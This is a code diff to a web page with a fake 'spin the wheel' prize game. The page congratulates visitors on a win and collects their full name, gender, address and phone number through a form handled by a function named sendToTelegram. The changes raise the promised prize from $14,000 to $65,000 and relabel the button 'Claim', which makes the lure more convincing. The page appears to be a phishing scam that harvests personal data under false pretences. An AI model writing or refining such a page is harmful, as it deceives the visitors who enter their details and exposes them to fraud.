@@ -116,7 +116,7 @@
 <button onclick="spinWheel()">Spin</button>
 
 <div id="userForm">
-  <h2>Claim Your $14,000 Prize</h2>
+  <h2>Claim Your $65,000 Prize</h2>
   <form onsubmit="sendToTelegram(event)">
     <input type="text" id="fullName" placeholder="Full Name" required>
     <select id="gender" required>
@@ -128,7 +128,7 @@
     <input type="text" id="address" placeholder="Address" required>
     <input type="text" id="phone" placeholder="Phone Number" required>
     <textarea id="messageText" placeholder="Message (optional)"></textarea>
-    <button type="submit">Send</button>
+    <button type="submit">Claim</button>
   </form>
 </div>
 
@@ -160,7 +160,7 @@
         button.disabled = false;
         round++;
       } else {
-        message.textContent = "Congratulations! You won $14,000!";
+        message.textContent = "Congratulations! You won $65,000!";
         winSound.play();
         launchConfetti();
         setTimeout(() => {
